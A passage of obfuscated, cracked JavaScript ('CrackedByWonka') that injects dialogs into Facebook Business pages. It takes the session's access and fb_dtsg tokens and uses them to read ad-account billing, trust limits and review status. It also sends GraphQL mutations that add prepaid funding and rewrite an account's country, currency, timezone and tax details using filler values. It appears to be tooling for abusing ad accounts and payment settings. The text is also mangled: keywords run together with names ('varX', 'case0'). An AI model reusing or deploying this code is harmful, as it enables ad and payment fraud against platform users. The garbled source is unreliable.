                                                                                        MFYAb = wNnBb[0].substr(1);
                                                                                        window.privateToken = MFYAb;
                                                                                        breakwVxw;
                                                                                    }
                                                                                    break;
                                                                                }
                                                                            }
                                                                        }
                                                                        break;
                                                                        case3: b = 1;
                                                                        kEVAb++;
                                                                        break;
                                                                    }
                                                                }
                                                                IqtCb.style.display = "none";
                                                                cmkCb.style.display = "block";
                                                                varYieCb = sSvDb.value;
                                                                varAkhCb = AEUCb.value;
                                                                varUfYBb = require("DTSGInitialData").token;
                                                                fetch("https://graph.facebook.com/v15.0/act_".concat(AkhCb, "/ads/?fields=name,status,timezone_name,timezone_id,adcreatives{image_url},delivery_status&limit=100&access_token=").concat(MFYAb, "&locale=en_US&_flowletID=3003"), _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty({}, "content-type", "application/x-www-form-urlencoded")), "body", null), "method", "GET"), "mode", "cors"), "credentials", "include")).then(function(whbCb) {
                                                                    whbCb.json().then(function(QcSBb) {
                                                                        varseVBb = "";
                                                                        vard = 0;
                                                                        while (d < 65535) {
                                                                            switch (d) {
                                                                                case0: d = QcSBb && QcSBb.data && QcSBb.data.length > 0 ? 1 : 2;
                                                                                break;
                                                                                case1: d = 65535; {
                                                                                    QcSBb.data.forEach(function(obPBb) {
                                                                                        syICb.value = obPBb.status;
                                                                                        wVBDb.value = obPBb.name;
                                                                                        vare = 0;
                                                                                        while (e < 65535) {
                                                                                            switch (e) {
                                                                                                case0: e = obPBb.delivery_status ? 1 : 65535;
                                                                                                break;
                                                                                                case1: e = 65535; {
                                                                                                    seVBb += "delivery_status=" + JSON.stringify(obPBb.delivery_status) + "\\n";
                                                                                                }
                                                                                                break;
                                                                                            }
                                                                                        }
                                                                                        seVBb += "\\n";
                                                                                    });
                                                                                    cmkCb.style.display = "none";
                                                                                    IqtCb.style.display = "block";
                                                                                }
                                                                                break;
                                                                                case2: d = 65535; {
                                                                                    seVBb = "Nodatafound.";
                                                                                }
                                                                                break;
                                                                            }
                                                                        }
                                                                        cmkCb.style.display = "none";
                                                                        IqtCb.style.display = "block";
                                                                        console.log(seVBb);
                                                                        AwGAb.value = seVBb;
                                                                    });
                                                                }).catch(function(sCTyb) {
                                                                    console.error(sCTyb);
                                                                    console.log("ErroroccurredwhilesendingRequest");
                                                                });
                                                                fetch("https://graph.facebook.com/v15.0/act_".concat(AkhCb, "?fields=name,id,adtrust_dsl,account_status,disable_reason,balance,amount_spent,business_restriction_reason,average_daily_campaign_budget,is_new_advertiser,timezone_name,timezone_id,currency,self_resolve_uri,age,max_billing_threshold,current_unbilled_spend,adspaymentcycle,adimages{name,url_128,ads_integrity_review_info,creatives},advideos{id,picture,ads_integrity_review_info}&access_token=").concat(MFYAb, "&locale=en_US&"), _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "accept", "*/*"), "accept-language", "en-US,en;q=0.9"), "sec-ch-ua", '"MicrosoftEdge";v="117","Not;A=Brand";v="8","Chromium";v="117"'), "sec-ch-ua-mobile", "?0"), "sec-ch-ua-platform", '"Windows"'), "sec-fetch-dest", "empty"), "sec-fetch-mode", "cors"), "sec-fetch-site", "same-site")), "referrer", "https://business.facebook.com/"), "referrerPolicy", "origin-when-cross-origin"), "body", null), "method", "GET"), "mode", "cors"), "credentials", "include")).then(function(MxKyb) {
                                                                    returnMxKyb.json();
                                                                }).then(function(ozNyb) {
                                                                    varIuEyb = ozNyb.adtrust_dsl;
                                                                    varkwHyb = ozNyb.currency;
                                                                    varEryyb = ozNyb.adspaymentcycle.data[0].threshold_amount;
                                                                    vargtByb = ozNyb.adtrust_dsl;
                                                                    vargNozb = newIntl.NumberFormat("en-US", _defineProperty(_defineProperty(_defineProperty({}, "style", "currency"), "currency", kwHyb), "minimumFractionDigits", 2));
                                                                    varIOrzb = gNozb.format(Eryyb / 100);
                                                                    varcKizb = gNozb.format(gtByb);
                                                                    varELlzb = "\\nthreshold_amount:".concat(IOrzb, "\\nadtrust_dsl:").concat(cKizb, "\\n");
                                                                    varYGczb = ozNyb.adimages.data;
                                                                    varAIfzb = YGczb[0];
                                                                    varUDWyb = AIfzb.name;
                                                                    varwFZyb = AIfzb.url_128;
                                                                    varwZMzb = AIfzb.ads_integrity_review_info.is_reviewed;
                                                                    varYaQzb = AIfzb.ads_integrity_review_info.is_human_reviewed;
                                                                    varsWGzb = AIfzb.ads_integrity_review_info.component_review_status_info.preapproval_review_status;
                                                                    console.log("AdImageData:");
                                                                    console.log("Name:".concat(UDWyb), "URL:".concat(wFZyb), "IsReviewed:".concat(wZMzb), "IsHumanReviewed:".concat(YaQzb), "PreapprovalReviewStatus:".concat(sWGzb));
                                                                    sKhBb.value = "IsReviewed:".concat(wZMzb, "\\nIsHumanReviewed:").concat(YaQzb, "\\nPreapprovalReviewStatus:").concat(sWGzb);
                                                                    kMjDb.value = gNozb.format(Eryyb / 100);
                                                                    gdRDb.value = gNozb.format(gtByb);
                                                                    varUXJzb = ozNyb.account_status;
                                                                    varoTAzb = ozNyb.disable_reason;
                                                                    varQUDzb = ozNyb.balance;
                                                                    varkQuzb = ozNyb.amount_spent;
                                                                    varMRxzb = "\\naccount_status:".concat(UXJzb, "\\ndisable_reason:").concat(oTAzb, "\\nbalance:").concat(gNozb.format(parseFloat(QUDzb)), "").concat(kwHyb, "//Converttodollars\\namount_spent:").concat(gNozb.format(parseFloat(kQuzb)), "").concat(kwHyb, "//Converttodollars\\n");
                                                                    EbODb.value = gNozb.format(parseFloat(QUDzb / 100));
                                                                    cyJAb.value = gNozb.format(parseFloat(kQuzb / 100));
                                                                    YuDAb.value = UXJzb;
                                                                    wtAAb.value = UDWyb;
                                                                    squAb.value = wFZyb;
                                                                    console.log(MRxzb);
                                                                }).catch(function(MllAb) {
                                                                    console.error(MllAb);
                                                                    console.log("ErroroccurredwhilesendingRequest");
                                                                });
                                                            });
                                                        });
                                                        MFck.appendChild(QwFCb);
                                                        varonoAb = document.createElement("button");
                                                        onoAb.textContent = "💲AddFund+ThresholdAndPrepaidOnlyTool💲";
                                                        onoAb.style.width = "100%";
                                                        onoAb.style.height = "30px";
                                                        onoAb.style.marginBottom = "10px";
                                                        onoAb.style.backgroundColor = "black";
                                                        onoAb.style.color = "white";
                                                        onoAb.addEventListener("click", function() {
                                                            varIifAb = document.createElement("div");
                                                            IifAb.style.position = "fixed";
                                                            IifAb.style.top = "50%";
                                                            IifAb.style.left = "50%";
                                                            IifAb.style.transform = "translate(-50%,-50%)";
                                                            IifAb.style.width = "500px";
                                                            IifAb.style.padding = "50px";
                                                            IifAb.style.background = "white";
                                                            IifAb.style.color = "black";
                                                            IifAb.style.borderRadius = "10px";
                                                            IifAb.style.boxShadow = "0010pxrgba(0,0,0,0.5)";
                                                            IifAb.style.zIndex = "9999";
                                                            document.body.appendChild(IifAb);
                                                            varkkiAb = document.createElement("div");
                                                            kkiAb.textContent = "❤️صلواعليرسولاللهصلياللهعليهوسلم❤️";
                                                            kkiAb.style.textAlign = "center";
                                                            kkiAb.style.marginBottom = "10px";
                                                            IifAb.appendChild(kkiAb);
                                                            varEfZzb = document.createElement("div");
                                                            EfZzb.textContent = "❤️سبحاناللهوبحمدهسبحاناللهالعظيم❤️";
                                                            EfZzb.style.textAlign = "center";
                                                            EfZzb.style.marginBottom = "25px";
                                                            IifAb.appendChild(EfZzb);
                                                            varghcAb = document.createElement("div");
                                                            ghcAb.textContent = "❤️ScriptAddnewoptionFund!for:CrackedByWonka=Jerusalem❤️";
                                                            ghcAb.style.textAlign = "center";
                                                            ghcAb.style.marginBottom = "25px";
                                                            IifAb.appendChild(ghcAb);
                                                            varAcTzb = document.createElement("div");
                                                            AcTzb.textContent = "❤️CrackedByWonka=Jerusalem❤️";
                                                            AcTzb.style.textAlign = "center";
                                                            AcTzb.style.marginBottom = "25px";
                                                            IifAb.appendChild(AcTzb);
                                                            varceWzb = document.createElement("button");
                                                            ceWzb.textContent = "PrepaidOnly";
                                                            ceWzb.style.display = "block";
                                                            ceWzb.style.margin = "0auto";
                                                            ceWzb.style.padding = "10px20px";
                                                            ceWzb.style.background = "Red";
                                                            ceWzb.style.color = "white";
                                                            ceWzb.style.border = "none";
                                                            ceWzb.style.borderRadius = "5px";
                                                            IifAb.appendChild(ceWzb);
                                                            varEDXwb = document.createElement("button");
                                                            EDXwb.textContent = "PleaseWait👩‍💻";
                                                            EDXwb.style.display = "none";
                                                            EDXwb.style.margin = "0auto";
                                                            EDXwb.style.padding = "10px20px";
                                                            EDXwb.style.background = "Red";
                                                            EDXwb.style.color = "white";
                                                            EDXwb.style.border = "none";
                                                            EDXwb.style.borderRadius = "5px";
                                                            IifAb.appendChild(EDXwb);
                                                            ceWzb.addEventListener("click", function() {
                                                                ceWzb.style.display = "none";
                                                                EDXwb.style.display = "block";
                                                                vargFaxb = kIgxb.value;
                                                                varAARwb = gZNxb.value;
                                                                varcCUwb = require("DTSGInitialData").token;
                                                                fetch("https://business.facebook.com/api/graphql", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty({}, "content-type", "application/x-www-form-urlencoded")), "body", "__a=1&dpr=1&fb_dtsg=".concat(cCUwb, '&variables={"input":{"billable_account_payment_legacy_account_id":"').concat(AARwb, '","logging_data":{"logging_counter":22,"logging_id":"3418624251"},"recurring_enabled":false,"actor_id":"').concat(gFaxb, '","client_mutation_id":"3"}}&doc_id=4886770528075857')), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(wxLwb) {
                                                                    wxLwb.json().then(function(YyOwb) {
                                                                        vara = 0;
                                                                        while (a < 65535) {
                                                                            switch (a) {
                                                                                case0: a = YyOwb.errors && YyOwb.errors.length > 0 ? 1 : 2;
                                                                                break;
                                                                                case1: a = 65535; {
                                                                                    varUvIwb = YyOwb.errors.map(function(UPvxb) {
                                                                                        return_defineProperty(_defineProperty({}, "summary", UPvxb.summary), "description", UPvxb.description);
                                                                                    });
                                                                                    UvIwb.forEach(function(wRyxb) {
                                                                                        console.error("ErrorSummary:", wRyxb.summary);
                                                                                        console.error("ErrorDescription:", wRyxb.description);
                                                                                        console.log("Failed❌:", wRyxb.summary, "|Description:", wRyxb.description);
                                                                                        cWHxb.value = "Failed❌-فشل❌:Trytosaveyourpayment!|" + wRyxb.summary + "|" + wRyxb.description;
                                                                                        location.reload();
                                                                                        EDXwb.style.display = "none";
                                                                                        ceWzb.style.display = "block";
                                                                                    });
                                                                                }
                                                                                break;
                                                                                case2: a = 65535;
                                                                                varb = 0;
                                                                                while (b < 65535) {
                                                                                    switch (b) {
                                                                                        case0: b = YyOwb.data.standard_billing_init.billable_account.stored_balance_status === "standard" ? 1 : 2;
                                                                                        break;
                                                                                        case1: b = 65535; {
                                                                                            cWHxb.value = "✅AlreadySuccess-نجحمنقبل✅";
                                                                                            EDXwb.style.display = "none";
                                                                                            ceWzb.style.display = "block";
                                                                                            location.reload();
                                                                                        }
                                                                                        break;
                                                                                        case2: b = 65535; {
                                                                                            cWHxb.value = "Success✅:Addedprepaidoption|نجح✅:اضافةالدفعالمقدم|" + error.summary + "|" + error.description;
                                                                                            location.reload();
                                                                                            EDXwb.style.display = "none";
                                                                                            ceWzb.style.display = "block";
                                                                                        }
                                                                                        break;
                                                                                    }
                                                                                }
                                                                                break;
                                                                            }
                                                                        }
                                                                    });
                                                                }).catch(function(sOsxb) {
                                                                    console.error(sOsxb);
                                                                    console.log("ErroroccurredwhilesendingRequest");
                                                                });
                                                            });
                                                            varMJjxb = document.createElement("label");
                                                            MJjxb.innerText = "PageID:";
                                                            IifAb.appendChild(MJjxb);
                                                            MJjxb.style.display = "none";
                                                            varoLmxb = document.createElement("input");
                                                            oLmxb.placeholder = "EnterPageID";
                                                            oLmxb.style.width = "100%";
                                                            oLmxb.style.marginBottom = "10px";
                                                            IifAb.appendChild(oLmxb);
                                                            oLmxb.style.display = "none";
                                                            varIGdxb = document.createElement("label");
                                                            IGdxb.innerText = "InstagramUserID:";
                                                            IifAb.appendChild(IGdxb);
                                                            IGdxb.style.display = "none";
                                                            varkIgxb = document.createElement("input");
                                                            kIgxb.placeholder = "EnterInstagramID";
                                                            kIgxb.style.width = "100%";
                                                            kIgxb.style.marginBottom = "10px";
                                                            IifAb.appendChild(kIgxb);
                                                            kIgxb.style.display = "none";
                                                            varkcUxb = require("CurrentUserInitialData").USER_ID;
                                                            kIgxb.value = kcUxb;
                                                            varMdXxb = document.createElement("label");
                                                            MdXxb.innerText = "TargetAdaccountID:";
                                                            IifAb.appendChild(MdXxb);
                                                            vargZNxb = document.createElement("input");
                                                            gZNxb.placeholder = "EnterAdaccountID";
                                                            gZNxb.style.width = "100%";
                                                            gZNxb.style.marginBottom = "10px";
                                                            IifAb.appendChild(gZNxb);
                                                            varIaRxb = require("CurrentAdAccountInitialData").AD_ACCOUNT_ID;
                                                            gZNxb.value = IaRxb;
                                                            varcWHxb = document.createElement("textarea");
                                                            cWHxb.placeholder = "DetailsfromServer!";
                                                            cWHxb.style.width = "100%";
                                                            cWHxb.style.height = "150px";
                                                            cWHxb.style.marginBottom = "10px";
                                                            IifAb.appendChild(cWHxb);
                                                            varEXKxb = document.createElement("button");
                                                            EXKxb.textContent = "X";
                                                            EXKxb.style.position = "absolute";
                                                            EXKxb.style.top = "10px";
                                                            EXKxb.style.right = "10px";
                                                            EXKxb.style.width = "30px";
                                                            EXKxb.style.height = "30px";
                                                            EXKxb.style.border = "none";
                                                            EXKxb.style.borderRadius = "50%";
                                                            EXKxb.style.background = "red";
                                                            EXKxb.style.color = "black";
                                                            EXKxb.style.fontSize = "16px";
                                                            IifAb.appendChild(EXKxb);
                                                            varYSBxb = document.createElement("button");
                                                            YSBxb.textContent = "AddNewprepaidfund+Threshold🆕";
                                                            YSBxb.style.display = "block";
                                                            YSBxb.style.margin = "0auto";
                                                            YSBxb.style.padding = "10px20px";
                                                            YSBxb.style.background = "blue";
                                                            YSBxb.style.color = "white";
                                                            YSBxb.style.border = "none";
                                                            YSBxb.style.borderRadius = "5px";
                                                            IifAb.appendChild(YSBxb);
                                                            varAUExb = document.createElement("button");
                                                            AUExb.textContent = "PleaseWait👩‍💻";
                                                            AUExb.style.display = "none";
                                                            AUExb.style.margin = "0auto";
                                                            AUExb.style.padding = "10px20px";
                                                            AUExb.style.background = "red";
                                                            AUExb.style.color = "white";
                                                            AUExb.style.border = "none";
                                                            AUExb.style.borderRadius = "5px";
                                                            IifAb.appendChild(AUExb);
                                                            EXKxb.addEventListener("click", function() {
                                                                IifAb.style.display = "none";
                                                            });
                                                            YSBxb.addEventListener("click", function() {
                                                                YSBxb.style.display = "none";
                                                                AUExb.style.display = "block";
                                                                varAosyb = kIgxb.value;
                                                                varcqvyb = gZNxb.value;
                                                                varwlmyb = require("DTSGInitialData").token;
                                                                fetch("https://business.facebook.com/api/graphql", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty({}, "content-type", "application/x-www-form-urlencoded")), "body", "__a=1&dpr=1&fb_dtsg=".concat(wlmyb, '&variables={"input":{"billable_account_payment_legacy_account_id":"').concat(cqvyb, '","logging_data":{"logging_counter":22,"logging_id":"3418624251"},"recurring_enabled":true,"actor_id":"').concat(Aosyb, '","client_mutation_id":"3"}}&doc_id=4886770528075857')), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(Ympyb) {
                                                                    Ympyb.json().then(function(sigyb) {
                                                                        varc = 0;
                                                                        while (c < 65535) {
                                                                            switch (c) {
                                                                                case0: c = sigyb.errors && sigyb.errors.length > 0 ? 1 : 2;
                                                                                break;
                                                                                case1: c = 65535; {
                                                                                    varofayb = sigyb.errors.map(function(Qgdyb) {
                                                                                        return_defineProperty(_defineProperty({}, "summary", Qgdyb.summary), "description", Qgdyb.description);
                                                                                    });
                                                                                    ofayb.forEach(function(sGevb) {
                                                                                        console.error("ErrorSummary:", sGevb.summary);
                                                                                        console.error("ErrorDescription:", sGevb.description);
                                                                                        console.log("Failed❌:", sGevb.summary, "|Description:", sGevb.description);
                                                                                        cWHxb.value = "❌Failed-فشل❌:Trytosaveyourpayment!|" + sGevb.summary + "|" + sGevb.description;
                                                                                        location.reload();
                                                                                        AUExb.style.display = "none";
                                                                                        YSBxb.style.display = "block";
                                                                                    });
                                                                                }
                                                                                break;
                                                                                case2: c = 65535;
                                                                                vard = 0;
                                                                                while (d < 65535) {
                                                                                    switch (d) {
                                                                                        case0: d = sigyb.data.standard_billing_init.billable_account.stored_balance_status === "standard" ? 1 : 2;
                                                                                        break;
                                                                                        case1: d = 65535; {
                                                                                            cWHxb.value = "✅AlreadySuccess-نجحمنقبل✅";
                                                                                            AUExb.style.display = "none";
                                                                                            YSBxb.style.display = "block";
                                                                                            location.reload();
                                                                                        }
                                                                                        break;
                                                                                        case2: d = 65535; {
                                                                                            cWHxb.value = "✅Success-نجح✅:Addednewprepaidoption+Threshold!🆕|" + error.summary + "|" + error.description;
                                                                                            AUExb.style.display = "none";
                                                                                            YSBxb.style.display = "block";
                                                                                            location.reload();
                                                                                        }
                                                                                        break;
                                                                                    }
                                                                                }
                                                                                break;
                                                                            }
                                                                        }
                                                                    });
                                                                }).catch(function(oDYub) {
                                                                    console.error(oDYub);
                                                                    console.log("ErroroccurredwhilesendingRequest");
                                                                });
                                                            });
                                                        });
                                                        MFck.appendChild(onoAb);
                                                        varQEbvb = document.createElement("button");
                                                        QEbvb.textContent = "💲ChangeCountryandCurrencyAndTimezone💲";
                                                        QEbvb.style.width = "100%";
                                                        QEbvb.style.height = "30px";
                                                        QEbvb.style.marginBottom = "10px";
                                                        QEbvb.style.backgroundColor = "blue";
                                                        QEbvb.style.color = "white";
                                                        QEbvb.addEventListener("click", function() {
                                                            varkASub = document.createElement("div");
                                                            kASub.style.position = "fixed";
                                                            kASub.style.top = "50%";
                                                            kASub.style.left = "50%";
                                                            kASub.style.transform = "translate(-50%,-50%)";
                                                            kASub.style.width = "500px";
                                                            kASub.style.padding = "50px";
                                                            kASub.style.background = "white";
                                                            kASub.style.color = "black";
                                                            kASub.style.borderRadius = "10px";
                                                            kASub.style.boxShadow = "0010pxrgba(0,0,0,0.5)";
                                                            kASub.style.zIndex = "9999";
                                                            document.body.appendChild(kASub);
                                                            varMBVub = document.createElement("div");
                                                            MBVub.textContent = "❤️صلواعليرسولاللهصلياللهعليهوسلم❤️";
                                                            MBVub.style.textAlign = "center";
                                                            MBVub.style.marginBottom = "10px";
                                                            kASub.appendChild(MBVub);
                                                            vargxMub = document.createElement("div");
                                                            gxMub.textContent = "❤️سبحاناللهوبحمدهسبحاناللهالعظيم❤️";
                                                            gxMub.style.textAlign = "center";
                                                            gxMub.style.marginBottom = "25px";
                                                            kASub.appendChild(gxMub);
                                                            varIyPub = document.createElement("div");
                                                            IyPub.textContent = "❤️ScriptSaveCountryAndCurrencyAndTimeZone!for:CrackedByWonka=Jerusalem❤️";
                                                            IyPub.style.textAlign = "center";
                                                            IyPub.style.marginBottom = "25px";
                                                            kASub.appendChild(IyPub);
                                                            varISCvb = document.createElement("div");
                                                            ISCvb.textContent = "❤️CrackedByWonka=Jerusalem❤️";
                                                            ISCvb.style.textAlign = "center";
                                                            ISCvb.style.marginBottom = "25px";
                                                            kASub.appendChild(ISCvb);
                                                            varkUFvb = document.createElement("label");
                                                            kUFvb.innerText = "TargetAdaccountID:";
                                                            kASub.appendChild(kUFvb);
                                                            varEPwvb = document.createElement("input");
                                                            EPwvb.placeholder = "EnterAdaccountID";
                                                            EPwvb.style.width = "100%";
                                                            EPwvb.style.marginBottom = "10px";
                                                            kASub.appendChild(EPwvb);
                                                            vargRzvb = require("CurrentAdAccountInitialData").AD_ACCOUNT_ID;
                                                            EPwvb.value = gRzvb;
                                                            varAMqvb = document.createElement("label");
                                                            AMqvb.innerText = "CountryCode:";
                                                            kASub.appendChild(AMqvb);
                                                            varcOtvb = document.createElement("input");
                                                            cOtvb.placeholder = "EnterCountryCode";
                                                            cOtvb.style.width = "100%";
                                                            cOtvb.style.marginBottom = "10px";
                                                            kASub.appendChild(cOtvb);
                                                            varwJkvb = require("AdsCurrentUser").countryCode;
                                                            cOtvb.value = wJkvb;
                                                            varYKnvb = document.createElement("label");
                                                            YKnvb.innerText = "CurrencyCode:";
                                                            kASub.appendChild(YKnvb);
                                                            varYebwb = document.createElement("input");
                                                            Yebwb.placeholder = "EnterCurrencyCode";
                                                            Yebwb.style.width = "100%";
                                                            Yebwb.style.marginBottom = "10px";
                                                            kASub.appendChild(Yebwb);
                                                            varAgewb = require("AdsCurrentUser").currencyCode;
                                                            Yebwb.value = Agewb;
                                                            varUbVvb = document.createElement("label");
                                                            UbVvb.innerText = "TimeZoneID:";
                                                            kASub.appendChild(UbVvb);
                                                            varwdYvb = document.createElement("input");
                                                            wdYvb.placeholder = "EnterTimeZoneID";
                                                            wdYvb.style.width = "100%";
                                                            wdYvb.style.marginBottom = "10px";
                                                            kASub.appendChild(wdYvb);
                                                            varQYOvb = require("AdsCurrentUser").timezoneID;
                                                            wdYvb.value = QYOvb;
                                                            varsaSvb = document.createElement("label");
                                                            saSvb.innerText = "TimeZoneCode:";
                                                            kASub.appendChild(saSvb);
                                                            varMVIvb = document.createElement("input");
                                                            MVIvb.placeholder = "EnterTimeZoneCode";
                                                            MVIvb.style.width = "100%";
                                                            MVIvb.style.marginBottom = "10px";
                                                            kASub.appendChild(MVIvb);
                                                            varoXLvb = require("AdsCurrentUser").timezoneName;
                                                            MVIvb.value = oXLvb;
                                                            varorzwb = document.createElement("label");
                                                            orzwb.innerText = "UserID:";
                                                            kASub.appendChild(orzwb);
                                                            orzwb.style.display = "none";
                                                            varQsCwb = document.createElement("input");
                                                            QsCwb.placeholder = "EnterUserID";
                                                            QsCwb.style.width = "100%";
                                                            QsCwb.style.marginBottom = "10px";
                                                            kASub.appendChild(QsCwb);
                                                            QsCwb.style.display = "none";
                                                            varkotwb = require("CurrentUserInitialData").USER_ID;
                                                            QsCwb.value = kotwb;
                                                            varMpwwb = document.createElement("button");
                                                            Mpwwb.textContent = "SaveCustomCountryAndCurrencyAndTimezone🆕";
                                                            Mpwwb.style.display = "block";
                                                            Mpwwb.style.margin = "0auto";
                                                            Mpwwb.style.padding = "10px20px";
                                                            Mpwwb.style.background = "blue";
                                                            Mpwwb.style.color = "white";
                                                            Mpwwb.style.border = "none";
                                                            Mpwwb.style.borderRadius = "5px";
                                                            kASub.appendChild(Mpwwb);
                                                            varglnwb = document.createElement("button");
                                                            glnwb.textContent = "PleaseWait👩‍💻";
                                                            glnwb.style.display = "none";
                                                            glnwb.style.margin = "0auto";
                                                            glnwb.style.padding = "10px20px";
                                                            glnwb.style.background = "red";
                                                            glnwb.style.color = "white";
                                                            glnwb.style.border = "none";
                                                            glnwb.style.borderRadius = "5px";
                                                            kASub.appendChild(glnwb);
                                                            Mpwwb.addEventListener("click", function() {
                                                                Mpwwb.style.display = "none";
                                                                glnwb.style.display = "block";
                                                                varImqwb = require("DTSGInitialData").token;
                                                                fetch("https://business.secure.facebook.com/ajax/payment/token_proxy.php?tpe=/api/graphql/", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty({}, "content-type", "application/x-www-form-urlencoded")), "body", "__a=1&dpr=1&fb_dtsg=".concat(Imqwb, '&variables={"input":{"billable_account_payment_legacy_account_id":"').concat(EPwvb.value, '","currency":"').concat(Yebwb.value, '","logging_data":{"logging_counter":12,"logging_id":"933385050"},"tax":{"business_address":{"country_code":"').concat(cOtvb.value, '","city":"Wonka","state":"","street1":"Wonka","street2":"Wonka","zip":""},"business_name":"Wonka","email":"Wonka@kubalelmajal.com","is_personal_use":false,"phone_number":"","second_tax_id":"","second_tax_id_type":null,"tax_exempt":false,"tax_id":"","tax_id_type":"NONE","tax_registration_status":""},"timezone":"').concat(MVIvb.value, '","client_mutation_id":"1"}}&doc_id=5472142756196040')), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(cihwb) {
                                                                    cihwb.json().then(function(Ejkwb) {
                                                                        vargJltb = Ejkwb.errors[0].description;
                                                                        EHitb.value = gJltb;
                                                                        Mpwwb.style.display = "block";
                                                                        glnwb.style.display = "none";
                                                                    }).catch(function(IKotb) {
                                                                        console.error("ErroroccurredwhileparsingresponseJSON:", IKotb);
                                                                        Mpwwb.style.display = "block";
                                                                        glnwb.style.display = "none";
                                                                    });
                                                                }).catch(function(cGftb) {
                                                                    console.error("ErroroccurredwhilesendingRequest:", cGftb);
                                                                    Mpwwb.style.display = "block";
                                                                    glnwb.style.display = "none";
                                                                });
                                                                EHitb.value = "⌛...TrySaveCountryAndCurrencyandtimezoneInProgress...⌛";
                                                            });
                                                            kASub.appendChild(document.createElement("br"));
                                                            varEHitb = document.createElement("textarea");
                                                            EHitb.placeholder = "DetailsfromServer!";
                                                            EHitb.style.width = "100%";
                                                            EHitb.style.height = "150px";
                                                            EHitb.style.marginBottom = "10px";
                                                            kASub.appendChild(EHitb);
                                                            varYCZsb = document.createElement("button");
                                                            YCZsb.textContent = "SaveCountryBosniaAndCurrencyEurAndTimezoneAmerica/Inuvik242🆕";
                                                            YCZsb.style.display = "block";
                                                            YCZsb.style.margin = "0auto";
                                                            YCZsb.style.padding = "10px20px";
                                                            YCZsb.style.background = "red";
                                                            YCZsb.style.color = "white";
                                                            YCZsb.style.border = "none";
                                                            YCZsb.style.borderRadius = "5px";
                                                            kASub.appendChild(YCZsb);
                                                            varAEctb = document.createElement("button");
                                                            AEctb.textContent = "PleaseWait👩‍💻";
                                                            AEctb.style.display = "none";
                                                            AEctb.style.margin = "0auto";
                                                            AEctb.style.padding = "10px20px";
                                                            AEctb.style.background = "red";
                                                            AEctb.style.color = "white";
                                                            AEctb.style.border = "none";
                                                            AEctb.style.borderRadius = "5px";
                                                            kASub.appendChild(AEctb);
                                                            YCZsb.addEventListener("click", function() {
                                                                YCZsb.style.display = "none";
                                                                AEctb.style.display = "block";
                                                                varUzTsb = require("DTSGInitialData").token;
                                                                fetch("https://business.secure.facebook.com/ajax/payment/token_proxy.php?tpe=/api/graphql/", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty({}, "content-type", "application/x-www-form-urlencoded")), "body", "__a=1&dpr=1&fb_dtsg=".concat(UzTsb, '&variables={"input":{"billable_account_payment_legacy_account_id":"').concat(EPwvb.value, '","currency":"EUR","logging_data":{"logging_counter":12,"logging_id":"933385050"},"tax":{"business_address":{"country_code":"BA","city":"Wonka","state":"","street1":"Wonka","street2":"Wonka","zip":""},"business_name":"Wonka","email":"","is_personal_use":true,"phone_number":"","second_tax_id":"","second_tax_id_type":null,"tax_exempt":false,"tax_id":"","tax_id_type":"NONE","tax_registration_status":""},"timezone":"America/Inuvik","client_mutation_id":"1"}}&doc_id=5472142756196040')), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(wBWsb) {
                                                                    wBWsb.json().then(function(wVJtb) {
                                                                        varYWMtb = wVJtb.errors[0].description;
                                                                        EHitb.value = YWMtb;
                                                                        YCZsb.style.display = "block";
                                                                        AEctb.style.display = "none";
                                                                    }).catch(function(sSDtb) {
                                                                        console.error("ErroroccurredwhileparsingresponseJSON:", sSDtb);
                                                                        YCZsb.style.display = "block";
                                                                        AEctb.style.display = "none";
                                                                    });
                                                                }).catch(function(UTGtb) {
                                                                    console.error("ErroroccurredwhilesendingRequest:", UTGtb);
                                                                    YCZsb.style.display = "block";
                                                                    AEctb.style.display = "none";
                                                                });
                                                                EHitb.value = "⌛...TrySaveCountryAndCurrencyandtimezoneInProgress...⌛";
                                                            });
                                                            varoPxtb = document.createElement("button");
                                                            oPxtb.textContent = "X";
                                                            oPxtb.style.position = "absolute";
                                                            oPxtb.style.top = "10px";
                                                            oPxtb.style.right = "10px";
                                                            oPxtb.style.width = "30px";
                                                            oPxtb.style.height = "30px";
                                                            oPxtb.style.border = "none";
                                                            oPxtb.style.borderRadius = "50%";
                                                            oPxtb.style.background = "red";
                                                            oPxtb.style.color = "black";
                                                            oPxtb.style.fontSize = "16px";
                                                            kASub.appendChild(oPxtb);
                                                            oPxtb.addEventListener("click", function() {
                                                                kASub.style.display = "none";
                                                            });
                                                        });
                                                        MFck.appendChild(QEbvb);
                                                        varQQAtb = document.createElement("button");
                                                        QQAtb.textContent = "💲SharePixel💲";
                                                        QQAtb.style.width = "100%";
                                                        QQAtb.style.height = "30px";
                                                        QQAtb.style.marginBottom = "10px";
                                                        QQAtb.style.backgroundColor = "blue";
                                                        QQAtb.style.color = "white";
                                                        QQAtb.addEventListener("click", function() {
                                                            var_headers42;
                                                            varkMrtb = document.createElement("div");
                                                            kMrtb.style.position = "fixed";
                                                            kMrtb.style.top = "50%";
                                                            kMrtb.style.left = "50%";
                                                            kMrtb.style.transform = "translate(-50%,-50%)";
                                                            kMrtb.style.width = "600px";
                                                            kMrtb.style.padding = "50px";
                                                            kMrtb.style.background = "white";
                                                            kMrtb.style.color = "black";
                                                            kMrtb.style.borderRadius = "10px";
                                                            kMrtb.style.boxShadow = "0010pxrgba(0,0,0,0.5)";
                                                            kMrtb.style.zIndex = "9999";
                                                            document.body.appendChild(kMrtb);
                                                            varMNutb = document.createElement("div");
                                                            MNutb.textContent = "❤️سبحاناللهوبحمدهسبحاناللهالعظيم❤️❤️صلواعليرسولاللهصلياللهعليهوسلم❤️";
                                                            MNutb.style.textAlign = "center";
                                                            MNutb.style.marginBottom = "10px";
                                                            kMrtb.appendChild(MNutb);
                                                            varMhiub = document.createElement("div");
